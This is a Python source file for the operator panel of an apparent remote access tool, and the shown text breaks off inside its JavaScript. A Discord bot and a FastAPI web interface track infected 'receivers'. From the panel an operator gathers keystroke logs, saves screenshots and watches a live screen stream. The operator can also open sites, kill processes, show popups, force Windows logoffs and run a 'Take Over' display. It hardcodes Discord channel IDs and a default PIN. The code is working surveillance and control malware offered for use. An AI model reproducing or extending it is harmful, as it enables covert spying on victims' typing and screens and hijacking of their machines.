# main.py
import asyncio
import importlib
import json
import os
import subprocess
import sys
import tempfile
import secrets
import time
from pathlib import Path
from typing import Optional
from urllib.parse import parse_qs

# ---------------- DEPENDENCIES ----------------
def ensure_dependencies():
    required = {
        "discord": "discord.py",
        "fastapi": "fastapi",
        "uvicorn": "uvicorn",
        "python_multipart": "python-multipart",
    }
    missing = []
    for mod, pkg in required.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])

ensure_dependencies()

import discord
from discord.ext import commands
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles

# ---------------- CONFIG ----------------
CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "1457385049845403648"))
BOT_TAG = ""
PANEL_PIN = os.getenv("PANEL_PIN", "S4mb")
try:
    # 0 disables idle expiry; session ends when the browser session ends.
    PIN_SESSION_TTL = int(os.getenv("PIN_SESSION_TTL", "0"))
except Exception:
    PIN_SESSION_TTL = 0
if PIN_SESSION_TTL < 0:
    PIN_SESSION_TTL = 0
PIN_COOKIE_NAME = "panel_session"

assert CONTROLLER_TOKEN
assert COMMAND_CHANNEL_ID
assert TARGET_CHANNEL_ID

ROOT_DIR = Path(__file__).parent
SCREENSHOT_DIR = ROOT_DIR / "screenshots"
SCREENSHOT_LOG = ROOT_DIR / "screenshots.json"
PIN_LOG_FILE = ROOT_DIR / "pin_sessions.jsonl"
_latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
_latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
_dm_messages: list[str] = []
_latest_dm_user: dict[str, str] = {"id": "", "name": ""}
STATE_FILE = ROOT_DIR / "receivers.json"
_receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str, "mode": str}
_selected_receiver: Optional[str] = None
_pin_sessions: dict[str, dict] = {}
STALE_SECONDS = 90
PRUNE_SECONDS = 60 * 60 * 24 * 30
MAX_DM_MESSAGES = 200
DM_REPLY_TEXT = "Meesage Reciever. We Will be with you shortly\n\nThank you for choosing our services <3"
_screenshot_log: list[dict[str, str]] = []

def _load_state():
    global _receivers, _selected_receiver
    if STATE_FILE.is_file():
        try:
            data = json.loads(STATE_FILE.read_text())
            _receivers = data.get("receivers", {})
            _selected_receiver = data.get("selected")
        except Exception:
            pass

def _save_state():
    try:
        STATE_FILE.write_text(json.dumps({"receivers": _receivers, "selected": _selected_receiver}))
    except Exception:
        pass

def _load_screenshot_log():
    global _screenshot_log
    if SCREENSHOT_LOG.is_file():
        try:
            data = json.loads(SCREENSHOT_LOG.read_text())
            if isinstance(data, list):
                _screenshot_log = [item for item in data if isinstance(item, dict)]
        except Exception:
            pass
    try:
        SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
    except Exception:
        pass
    if _screenshot_log:
        last = _screenshot_log[-1]
        _latest_screenshot["url"] = str(last.get("url", ""))
        _latest_screenshot["message_id"] = str(last.get("message_id", ""))
        _latest_screenshot["ts"] = str(last.get("ts", ""))

def _save_screenshot_log():
    try:
        SCREENSHOT_LOG.write_text(json.dumps(_screenshot_log))
    except Exception:
        pass

def _prune_pin_sessions(now: Optional[float] = None):
    if PIN_SESSION_TTL <= 0:
        return
    if now is None:
        now = time.time()
    for token, info in list(_pin_sessions.items()):
        expires = info.get("expires")
        if expires and expires <= now:
            _pin_sessions.pop(token, None)

def _append_pin_log(entry: dict):
    entry["ts"] = time.time()
    try:
        with PIN_LOG_FILE.open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(entry) + "\n")
    except Exception:
        pass

def _get_client_ip(request: Request) -> str:
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    if request.client:
        return request.client.host
    return ""

def _get_session_token(cookies: dict) -> Optional[str]:
    if not cookies:
        return None
    return cookies.get(PIN_COOKIE_NAME)

def _validate_pin_session(token: Optional[str], refresh: bool = False) -> bool:
    if not token:
        return False
    if PIN_SESSION_TTL > 0:
        _prune_pin_sessions()
    info = _pin_sessions.get(token)
    if not info:
        return False
    now = time.time()
    if PIN_SESSION_TTL > 0:
        expires = info.get("expires")
        if expires and expires <= now:
            _pin_sessions.pop(token, None)
            return False
        if refresh:
            info["expires"] = now + PIN_SESSION_TTL
            info["last_seen"] = now
    elif refresh:
        info["last_seen"] = now
    return True

def _session_ok(request: Request, refresh: bool = False) -> bool:
    token = _get_session_token(request.cookies)
    return _validate_pin_session(token, refresh=refresh)

def _session_ok_from_cookies(cookies: dict, refresh: bool = False) -> bool:
    token = _get_session_token(cookies or {})
    return _validate_pin_session(token, refresh=refresh)

def _create_pin_session(request: Request, client_id: str) -> str:
    now = time.time()
    token = secrets.token_urlsafe(24)
    expires = now + PIN_SESSION_TTL if PIN_SESSION_TTL > 0 else None
    info = {
        "client_id": client_id or "",
        "ip": _get_client_ip(request),
        "ua": request.headers.get("user-agent", ""),
        "created": now,
        "last_seen": now,
        "expires": expires,
    }
    _pin_sessions[token] = info
    _append_pin_log({
        "hwid": info["client_id"],
        "ip": info["ip"],
        "ua": info["ua"],
        "expires": info["expires"],
    })
    return token

def _prune_receivers(now: Optional[float] = None) -> bool:
    global _selected_receiver
    if now is None:
        now = time.time()
    removed = False
    for rid in list(_receivers.keys()):
        last_seen = _receivers[rid].get("last_seen", 0)
        if now - last_seen > PRUNE_SECONDS:
            _receivers.pop(rid, None)
            removed = True
            if _selected_receiver == rid:
                _selected_receiver = None
    if removed:
        _save_state()
    return removed

def _receiver_status(info: dict, now: Optional[float] = None) -> tuple[str, str, bool]:
    if now is None:
        now = time.time()
    last_seen = info.get("last_seen", 0)
    online = (now - last_seen) <= STALE_SECONDS
    if not online:
        return ("Offline", "offline", False)
    mode = (info.get("mode") or "").lower()
    if mode in ("gif", "gif_display"):
        return ("Gif Display", "gif", True)
    if mode in ("live", "live_view", "stream"):
        return ("Live View", "live", True)
    return ("Online", "online", True)

def _set_receiver_mode(rid: Optional[str], mode: str):
    if not rid:
        return
    info = _receivers.get(rid)
    if not info:
        return
    if mode:
        info["mode"] = mode
    else:
        info.pop("mode", None)
    _save_state()

def _remove_receiver(rid: str) -> bool:
    global _selected_receiver
    if rid in _receivers:
        _receivers.pop(rid, None)
        if _selected_receiver == rid:
            _selected_receiver = None
        _save_state()
        return True
    return False

async def _store_screenshot_attachment(
    att: discord.Attachment,
    message: discord.Message,
    index: int,
) -> Optional[dict[str, str]]:
    name = (att.filename or "").lower()
    if not name.endswith((".png", ".jpg", ".jpeg")):
        return None
    ext = Path(name).suffix.lower()
    if ext not in (".png", ".jpg", ".jpeg"):
        ext = ".png"
    filename = f"{message.id}_{index}{ext}"
    target = SCREENSHOT_DIR / filename
    try:
        data = await att.read()
    except Exception as e:
        print("Failed to read screenshot attachment:", e)
        return None
    try:
        target.write_bytes(data)
    except Exception as e:
        print("Failed to save screenshot:", e)
        return None
    entry = {
        "id": filename,
        "url": f"/screenshots/{filename}",
        "message_id": str(message.id),
        "ts": str(message.created_at),
    }
    _screenshot_log.append(entry)
    _save_screenshot_log()
    return entry

_load_state()
_load_screenshot_log()

# ---------------- DISCORD ----------------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="?", intents=intents)
_controller_ready = asyncio.Event()
_controller_error: Optional[str] = None

async def _get_channel(cid: int) -> discord.TextChannel:
    ch = bot.get_channel(cid)
    return ch or await bot.fetch_channel(cid)

@bot.event
async def on_ready():
    print(f"[SERVER] Logged in as {bot.user}")
    _controller_ready.set()

@bot.event
async def on_message(message: discord.Message):
    # Track DMs (non-commands)
    if message.guild is None and not message.author.bot:
        content = (message.content or "").strip()
        prefix = bot.command_prefix
        prefixes: tuple[str, ...] = ()
        if isinstance(prefix, str):
            prefixes = (prefix,)
        elif isinstance(prefix, (list, tuple, set)):
            prefixes = tuple(str(p) for p in prefix)
        is_command = content and prefixes and any(content.startswith(p) for p in prefixes if p)
        if content and not is_command:
            timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
            username = message.author.name or str(message.author)
            line = f"{timestamp} - {username}: {content}"
            _dm_messages.append(line)
            if len(_dm_messages) > MAX_DM_MESSAGES:
                _dm_messages.pop(0)
            _latest_dm_user["id"] = str(message.author.id)
            _latest_dm_user["name"] = username
    # Track latest screenshot posted by receiver
    if message.channel.id == TARGET_CHANNEL_ID and message.attachments:
        for idx, att in enumerate(message.attachments):
            entry = await _store_screenshot_attachment(att, message, idx)
            if entry:
                _latest_screenshot["url"] = entry["url"]
                _latest_screenshot["message_id"] = entry["message_id"]
                _latest_screenshot["ts"] = entry["ts"]
    if message.channel.id == LOG_CHANNEL_ID and message.content:
        text = (message.content or "").strip()
        if text.startswith("```") and text.endswith("```"):
            inner = text[3:-3]
            if inner.startswith("\n"):
                text = inner[1:]
            elif "\n" in inner:
                text = inner.split("\n", 1)[1]
            else:
                text = inner
        _latest_keylog["text"] = text
        _latest_keylog["message_id"] = str(message.id)
        _latest_keylog["ts"] = str(message.created_at)
    if message.channel.id == COMMAND_CHANNEL_ID:
        content = (message.content or "").strip()
        if not content:
            return
        tokens = content.split()
        if BOT_TAG and tokens and tokens[0] == BOT_TAG:
            tokens = tokens[1:]
        if tokens and tokens[0] in ("ONLINE", "PING") and len(tokens) >= 3:
            receiver_id = tokens[1].strip()
            tag = tokens[2].strip()
            now = time.time()
            entry = _receivers.get(receiver_id, {"alias": "", "tag": tag, "last_seen": now, "mode": ""})
            entry.setdefault("alias", "")
            entry.setdefault("mode", "")
            entry["tag"] = tag
            entry["last_seen"] = now
            _receivers[receiver_id] = entry
            if _selected_receiver is None:
                _selected_receiver = receiver_id
            _save_state()
# ---------------- WEBSOCKET HUB ----------------
class Hub:
    def __init__(self):
        self.clients: set[WebSocket] = set()
        self.lock = asyncio.Lock()

    async def add(self, ws: WebSocket):
        async with self.lock:
            self.clients.add(ws)

    async def remove(self, ws: WebSocket):
        async with self.lock:
            self.clients.discard(ws)


    async def broadcast_bytes(self, data: bytes, *, sender: Optional[WebSocket] = None):
        dead = []
        async with self.lock:
            for ws in list(self.clients):
                if sender is not None and ws is sender:
                    continue
                try:
                    await ws.send_bytes(data)
                except Exception:
                    dead.append(ws)
            for ws in dead:
                self.clients.discard(ws)

hub = Hub()

class LiveHub:
    def __init__(self):
        self.viewers: set[WebSocket] = set()
        self.lock = asyncio.Lock()
        self.latest: Optional[bytes] = None

    async def add_viewer(self, ws: WebSocket):
        async with self.lock:
            self.viewers.add(ws)

    async def remove_viewer(self, ws: WebSocket):
        async with self.lock:
            self.viewers.discard(ws)

    async def broadcast(self, data: bytes):
        self.latest = data
        dead = []
        async with self.lock:
            for ws in list(self.viewers):
                try:
                    await ws.send_bytes(data)
                except Exception:
                    dead.append(ws)
            for ws in dead:
                self.viewers.discard(ws)

_live_hubs: dict[str, LiveHub] = {}

# ---------------- FASTAPI ----------------
app = FastAPI(title="Controller")
SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
app.mount("/screenshots", StaticFiles(directory=str(SCREENSHOT_DIR)), name="screenshots")

@app.middleware("http")
async def pin_session_guard(request: Request, call_next):
    path = request.url.path
    if path.startswith("/api") or path.startswith("/ui"):
        if path in ("/api/pin", "/api/session"):
            return await call_next(request)
        if not _session_ok(request, refresh=True):
            if path.startswith("/ui"):
                wants_json = request.headers.get("x-requested-with") == "fetch"
                if wants_json:
                    return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
                return RedirectResponse(url="/", status_code=303)
            return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    return await call_next(request)

CONTROL_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Controller</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;600&family=Space+Grotesk:wght@400;500;600&display=swap');
    :root {
      --bg: #0b0907;
      --bg-2: #120f0c;
      --card: #14110d;
      --card-2: #0f0c09;
      --border: #2a241c;
      --text: #efe7dc;
      --muted: #b7a897;
      --accent: #c9a073;
      --accent-2: #8a5c34;
      --danger: #b54a35;
      --success: #7a9a63;
      --shadow: rgba(0,0,0,0.55);
    }
    * { box-sizing: border-box; }
    body {
      font-family: "Space Grotesk", "Segoe UI", sans-serif;
      background: radial-gradient(circle at 20% 15%, rgba(201,160,115,0.08), transparent 40%),
                  radial-gradient(circle at 80% 0%, rgba(138,92,52,0.12), transparent 45%),
                  var(--bg);
      color: var(--text);
      margin: 0;
      padding: 32px 20px 60px;
      min-height: 100vh;
    }
    .layout { display: grid; grid-template-columns: minmax(320px, 1fr); gap: 18px; align-items: start; max-width: 1100px; margin: 0 auto; }
    .card {
      background: linear-gradient(180deg, rgba(20,17,13,0.98), rgba(15,12,9,0.98));
      border: 1px solid var(--border);
      border-radius: 18px;
      padding: 22px;
      box-shadow: 0 18px 40px var(--shadow);
    }
    h1, h2 { font-family: "Fraunces", "Times New Roman", serif; font-weight: 600; }
    h1 { margin: 0 0 14px; font-size: 20px; letter-spacing: 0.2px; }
    h2 { margin: 0 0 10px; font-size: 15px; letter-spacing: 0.2px; }
    p { margin: 0 0 12px; }
    label { display: block; margin-bottom: 6px; color: var(--muted); font-size: 13px; }
    input, button, select, textarea { font-family: inherit; }
    input[type=file], input[type=text], input[type=number], select, textarea {
      width: 100%;
      margin-bottom: 10px;
      padding: 11px 12px;
      border-radius: 12px;
      border: 1px solid var(--border);
      background: var(--card-2);
      color: var(--text);
      transition: border-color 120ms ease, box-shadow 120ms ease;
    }
    input:focus, select:focus, textarea:focus {
      outline: none;
      border-color: rgba(201,160,115,0.7);
      box-shadow: 0 0 0 2px rgba(201,160,115,0.15);
    }
    textarea { min-height: 96px; resize: vertical; }
    button {
      cursor: pointer;
      background: linear-gradient(135deg, var(--accent), var(--accent-2));
      color: #1a120c;
      border: none;
      border-radius: 12px;
      padding: 10px 16px;
      font-weight: 600;
      letter-spacing: 0.2px;
      transition: transform 120ms ease, filter 120ms ease;
    }
    button:hover { filter: brightness(1.05); }
    button:active { transform: translateY(1px); }
    button.secondary { background: transparent; color: var(--text); border: 1px solid var(--border); }
    button.danger { background: linear-gradient(135deg, #c46a41, var(--danger)); color: #1a0f0a; }
    .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
    small { color: var(--muted); }
    code { background: rgba(201,160,115,0.1); padding: 2px 6px; border-radius: 6px; border: 1px solid rgba(201,160,115,0.2); }
    img { max-width: 100%; border-radius: 12px; border: 1px solid var(--border); }
    .pill { padding: 6px 12px; border-radius: 999px; border: 1px solid var(--border); background: rgba(15,12,9,0.8); color: var(--muted); font-size: 12px; }
    .tabs { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; border-bottom: 1px solid var(--border); padding-bottom: 12px; }
    .tab-btn {
      background: transparent;
      color: var(--muted);
      border: 1px solid transparent;
      padding: 7px 12px;
      border-radius: 999px;
      cursor: pointer;
      transition: color 120ms ease, border-color 120ms ease, background 120ms ease;
    }
    .tab-btn:hover { color: var(--text); border-color: rgba(201,160,115,0.3); }
    .tab-btn.active { background: rgba(201,160,115,0.12); color: var(--text); border-color: rgba(201,160,115,0.5); }
    .tab-pane { display: none; }
    .tab-pane.active { display: block; animation: fadeIn 160ms ease; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }
    .receiver-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
    .receiver-list { display: grid; gap: 12px; }
    .receiver-item { display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: center; padding: 12px; border: 1px solid var(--border); border-radius: 14px; background: rgba(16,13,10,0.9); }
    .receiver-item.selected { border-color: rgba(201,160,115,0.6); box-shadow: 0 0 0 1px rgba(201,160,115,0.25); }
    .receiver-info { display: flex; flex-direction: column; gap: 6px; }
    .receiver-title { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
    .receiver-name { font-weight: 600; letter-spacing: 0.2px; }
    .receiver-meta { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; font-size: 12px; color: var(--muted); }
    .status-pill { padding: 4px 8px; border-radius: 999px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; border: 1px solid var(--border); background: rgba(15,12,9,0.8); }
    .status-online { border-color: rgba(122,154,99,0.5); color: #b9d2a6; background: rgba(122,154,99,0.15); }
    .status-offline { border-color: rgba(181,74,53,0.5); color: #f0b0a2; background: rgba(181,74,53,0.15); }
    .status-gif { border-color: rgba(201,160,115,0.5); color: #e9d2b7; background: rgba(201,160,115,0.15); }
    .status-live { border-color: rgba(169,126,82,0.6); color: #f0d8bb; background: rgba(169,126,82,0.2); }
    .receiver-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
    .receiver-actions form { margin: 0; }
    .receiver-id { opacity: 0.8; }
    .receiver-summary { margin: 0 0 10px; color: var(--muted); font-size: 12px; }
    .receiver-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); background: rgba(16,13,10,0.5); }
    .shot-list { display: grid; gap: 10px; margin-top: 12px; }
    .shot-item { border: 1px solid var(--border); border-radius: 14px; background: rgba(16,13,10,0.85); padding: 10px; }
    .shot-summary { display: grid; grid-template-columns: auto 1fr; gap: 10px; align-items: center; cursor: pointer; list-style: none; }
    .shot-summary::-webkit-details-marker { display: none; }
    .shot-thumb { width: 72px; height: 54px; object-fit: cover; border-radius: 10px; border: 1px solid var(--border); }
    .shot-time { font-size: 12px; color: var(--muted); }
    .shot-full { margin-top: 10px; width: 100%; border-radius: 12px; border: 1px solid var(--border); }
    .live-wrap { margin-top: 12px; padding: 10px; border: 1px solid var(--border); border-radius: 14px; background: rgba(12,9,7,0.8); }
    .live-img { width: 100%; display: block; border-radius: 12px; border: 1px solid var(--border); background: #0a0806; }
    .live-status { margin-left: auto; }
    .rename-section { margin-top: 16px; padding: 12px; border: 1px solid var(--border); border-radius: 14px; background: rgba(16,13,10,0.85); }
    .rename-section h2 { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.2px; }
    .rename-grid { display: grid; grid-template-columns: minmax(160px, 1fr) minmax(200px, 2fr) auto; gap: 10px; align-items: center; }
    .rename-select { width: 100%; padding: 10px; border-radius: 12px; border: 1px solid var(--border); background: var(--card-2); color: var(--text); }
    .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
    .mono-block {
      margin-top: 12px;
      padding: 12px;
      background: var(--card-2);
      border: 1px solid var(--border);
      border-radius: 12px;
      max-height: 260px;
      overflow: auto;
      font-size: 13px;
      color: var(--text);
    }
    .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #c46a41, var(--danger)); color: #1a0f0a; box-shadow: 0 14px 28px rgba(181,74,53,0.35); }
    .panic-btn:active { transform: translateY(1px); }
    .locked .app { pointer-events: none; filter: blur(1px) brightness(0.9); }
    .pin-overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: rgba(9,7,5,0.92); backdrop-filter: blur(4px); z-index: 1200; }
    .pin-card { width: min(360px, 90vw); background: linear-gradient(180deg, rgba(20,17,13,0.98), rgba(15,12,9,0.98)); border: 1px solid var(--border); border-radius: 16px; padding: 18px; box-shadow: 0 12px 30px var(--shadow); }
  </style>
</head>
<body class="locked">
  <div class="app">
  <div class="layout">
    <div class="card">
      <div class="tabs">
        <button class="tab-btn active" data-tab="surprise">Take Over</button>
        <button class="tab-btn" data-tab="select">Select Target</button>
        <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
        <button class="tab-btn" data-tab="volume">Volume ;0</button>
        <button class="tab-btn" data-tab="screen">Screen</button>
        <button class="tab-btn" data-tab="logs">Logs</button>
        <button class="tab-btn" data-tab="messages">Messages</button>
        <button class="tab-btn" data-tab="popup">Popup</button>
        <button class="tab-btn" data-tab="remotes">remote's</button>
      </div>
      <div class="tab-pane active" data-tab="surprise">
        <h1>Take Over</h1>
        <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>M.gif</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
        <div class="row">
          <form method="post" action="/ui/surprise">
            <button type="submit">Send & Display</button>
          </form>
          <form method="post" action="/ui/gif/stop">
            <button class="secondary" type="submit">Stop Display</button>
          </form>
        </div>
      </div>
      <div class="tab-pane" data-tab="select">
        <h1>Select Target</h1>
        <div id="receiver-summary" class="receiver-summary"></div>
        <div id="receiver-list" class="receiver-list"></div>
        <div class="rename-section">
          <h2>Rename Display</h2>
          <form id="rename-form" method="post" action="/ui/rename/">
            <div class="rename-grid">
              <select id="rename-target" name="rid" class="rename-select"></select>
              <input id="rename-alias" class="rename-input" name="alias" type="text" placeholder="New display name">
              <button class="secondary" type="submit">Save Name</button>
            </div>
          </form>
        </div>
      </div>
      <div class="tab-pane" data-tab="openclose">
        <h1>Open & Close :3</h1>
        <form method="post" action="/ui/open">
          <label for="url">Open website</label>
          <input id="url" name="url" type="text" placeholder="https://google.com" required>
          <button type="submit">Open</button>
        </form>
        <form method="post" action="/ui/close" style="margin-top:12px;">
          <label for="proc">Close process (name.exe)</label>
          <input id="proc" name="proc" type="text" placeholder="chrome.exe" required>
          <button class="secondary" type="submit">Close</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="volume">
        <h1>Volume ;0</h1>
        <form method="post" action="/ui/volume">
          <label for="level">Set volume (0-100)</label>
          <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
          <button type="submit">Set Volume</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="screen">
        <h1>Screen</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Capture a screenshot on the selected receiver and keep a log here.
        </p>
        <div class="row">
          <form method="post" action="/ui/live/start">
            <button type="submit">Start Live</button>
          </form>
          <form method="post" action="/ui/live/stop">
            <button type="submit" class="secondary">Stop Live</button>
          </form>
          <span id="live-status" class="pill live-status">Live: off</span>
        </div>
        <div class="live-wrap">
          <img id="live-img" class="live-img" alt="Live view">
        </div>
        <div class="row">
          <form method="post" action="/ui/screenshot">
            <button type="submit">Take Screenshot</button>
          </form>
        </div>
        <div id="screenshot-list" class="shot-list"></div>
        <div id="screenshot-empty" class="receiver-empty" style="display:none;">No screenshots yet.</div>
      </div>
      <div class="tab-pane" data-tab="logs">
        <h1>Key Logs</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Start / stop key logging on the selected receiver.
          Logged keys auto-expire after 60 seconds.
        </p>

        <div class="row">
          <form method="post" action="/ui/logs/start">
            <button type="submit">Start Logging</button>
          </form>

          <form method="post" action="/ui/logs/stop">
            <button class="secondary" type="submit">Stop Logging</button>
          </form>
        </div>

        <pre id="log-output" class="mono-block">Waiting for logs…</pre>
      </div>
      <div class="tab-pane" data-tab="messages">
        <h1>Messages</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          DMs received by the bot (non-commands).
        </p>
        <div class="row">
          <form method="post" action="/ui/messages/reply">
            <button type="submit">Reply Latest DM</button>
          </form>
        </div>
        <pre id="message-output" class="mono-block">Waiting for messages...</pre>
      </div>
      <div class="tab-pane" data-tab="popup">
        <h1>Custom Popup</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Send a custom message popup to the selected receiver.
        </p>
        <form method="post" action="/ui/popup">
          <label for="popup-message">Popup message</label>
          <textarea id="popup-message" name="message" placeholder="Type your message..." required></textarea>
          <button type="submit">Send</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="remotes">
        <h1>Remote's</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Log out the current Windows session on the selected receiver.
        </p>
        <form method="post" action="/ui/logout">
          <button class="secondary" type="submit">Log Out</button>
        </form>
      </div>
    </div>
  </div>
  <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
  </div>
  <div id="pin-overlay" class="pin-overlay">
    <div class="pin-card">
      <h1>Enter PIN</h1>
      <p style="margin: 4px 0 12px; color:var(--muted);">PIN required to access controls.</p>
      <form id="pin-form">
        <input id="pin-input" type="password" inputmode="text" autocomplete="off" placeholder="PIN" required>
        <button type="submit">Unlock</button>
      </form>
      <small id="pin-error" style="color:#f97316;"></small>
    </div>
  </div>
  <script>
    const pinOverlay = document.getElementById('pin-overlay');
    const pinForm = document.getElementById('pin-form');
    const pinInput = document.getElementById('pin-input');
    const pinError = document.getElementById('pin-error');
    const PIN_CLIENT_KEY = 'panel_client_id';
    const PIN_SESSION_KEY = 'panel_session_ok';
    let sessionActive = false;
    function lockUI(message) {
      sessionActive = false;
      document.body.classList.add('locked');
      if (pinOverlay) pinOverlay.style.display = 'flex';
      if (pinError) pinError.textContent = message || '';
      try { sessionStorage.removeItem(PIN_SESSION_KEY); } catch (e) { /* ignore */ }
    }
    function unlockUI() {
      sessionActive = true;
      document.body.classList.remove('locked');
      if (pinOverlay) pinOverlay.style.display = 'none';
      try { sessionStorage.setItem(PIN_SESSION_KEY, '1'); } catch (e) { /* ignore */ }
    }
    function getClientId() {
      try {
        let existing = localStorage.getItem(PIN_CLIENT_KEY);
        if (existing) return existing;
        let value = '';
        if (window.crypto && crypto.randomUUID) {
          value = crypto.randomUUID();
        } else {
          value = 'cid-' + Math.random().toString(36).slice(2) + Date.now().toString(36);
        }
        localStorage.setItem(PIN_CLIENT_KEY, value);
        return value;
      } catch (e) {
        return 'cid-' + Math.random().toString(36).slice(2) + Date.now().toString(36);
      }
    }
    async function checkSession() {
      try {
        if (!sessionStorage.getItem(PIN_SESSION_KEY)) {
          lockUI('');
          return false;
        }
        const res = await fetch('/api/session');
        if (res.ok) {
          const data = await res.json();
          if (data && data.ok) {
            unlockUI();
            return true;
          }
        }
      } catch (e) { /* ignore */ }
      lockUI('');
      return false;
    }
    async function submitPin(pinValue) {
      const body = new URLSearchParams();
      body.set('pin', pinValue || '');
      body.set('client_id', getClientId());
      try {
        const res = await fetch('/api/pin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body,
        });
        if (res.ok) {
          if (pinError) pinError.textContent = '';
          unlockUI();
          return true;
        }
      } catch (e) { /* ignore */ }
      lockUI('Incorrect PIN');
      return false;
    }
    async function fetchAuthed(url, options) {
      const opts = options ? { ...options } : {};
      const headers = Object.assign({ 'X-Requested-With': 'fetch' }, opts.headers || {});
      opts.headers = headers;
      const res = await fetch(url, opts);
      if (res.status === 401) {
        lockUI(sessionActive ? 'Session expired. Enter PIN.' : '');
        return null;
      }
      return res;
    }
    if (pinForm) {
      pinForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const value = pinInput ? pinInput.value : '';
        const ok = await submitPin(value);
        if (pinInput) {
          pinInput.value = '';
          if (!ok) pinInput.focus();
        }
      });
    }
    window.addEventListener('load', async () => {
      await checkSession();
      if (document.body.classList.contains('locked') && pinInput) {
        pinInput.focus();
      }
    });
    let selectedReceiver = null;
    let liveSocket = null;
    let liveWanted = false;
    let liveTarget = null;
    const liveImg = document.getElementById('live-img');
    const liveStatus = document.getElementById('live-status');
    let lastReceiverList = [];
    const renameForm = document.getElementById('rename-form');
    const renameSelect = document.getElementById('rename-target');
    const renameInput = document.getElementById('rename-alias');

    function updateRenameSection(rec) {
      if (!renameForm || !renameSelect || !renameInput) return;
      if (!rec) {
        renameForm.action = '/ui/rename/';
        renameInput.placeholder = 'No receiver selected';
        if (document.activeElement !== renameInput) {
          renameInput.value = '';
        }
        renameForm.querySelector('button').disabled = true;
        return;
      }
      renameForm.action = '/ui/rename/' + encodeURIComponent(rec.id);
      renameForm.querySelector('button').disabled = false;
      if (document.activeElement !== renameInput) {
        renameInput.value = rec.alias || '';
        renameInput.placeholder = rec.name || rec.tag || rec.id;
      }
    }

    if (renameSelect) {
      renameSelect.addEventListener('change', () => {
        const rid = renameSelect.value;
        const rec = lastReceiverList.find(item => item.id === rid);
        updateRenameSection(rec);
      });
    }

    function setLiveStatus(text) {
      if (liveStatus) liveStatus.textContent = text;
    }

    function buildLiveUrl(rid) {
      const scheme = location.protocol === 'https:' ? 'wss' : 'ws';
      return `${scheme}://${location.host}/live/${encodeURIComponent(rid)}?role=viewer`;
    }

    function startLiveView() {
      liveWanted = true;
      if (!selectedReceiver) {
        setLiveStatus('Live: select receiver');
        return;
      }
      const url = buildLiveUrl(selectedReceiver);
      if (liveSocket && liveSocket.readyState <= 1 && liveTarget === url) {
        return;
      }
      stopLiveView(false);
      liveTarget = url;
      liveSocket = new WebSocket(url);
      liveSocket.binaryType = 'arraybuffer';
      setLiveStatus('Live: connecting');
      liveSocket.onopen = () => setLiveStatus('Live: connected');
      liveSocket.onerror = () => setLiveStatus('Live: error');
      liveSocket.onclose = () => {
        setLiveStatus(liveWanted ? 'Live: disconnected' : 'Live: off');
      };
      liveSocket.onmessage = (event) => {
        if (!liveImg) return;
        const blob = new Blob([event.data], { type: 'image/jpeg' });
        const obj = URL.createObjectURL(blob);
        if (liveImg.dataset.lastUrl) {
          URL.revokeObjectURL(liveImg.dataset.lastUrl);
        }
        liveImg.dataset.lastUrl = obj;
        liveImg.src = obj;
      };
    }

    function stopLiveView(setOff = true) {
      if (setOff) liveWanted = false;
      if (liveSocket) {
        try { liveSocket.close(); } catch (e) { /* ignore */ }
      }
      liveSocket = null;
      liveTarget = null;
      if (liveImg) {
        if (liveImg.dataset.lastUrl) {
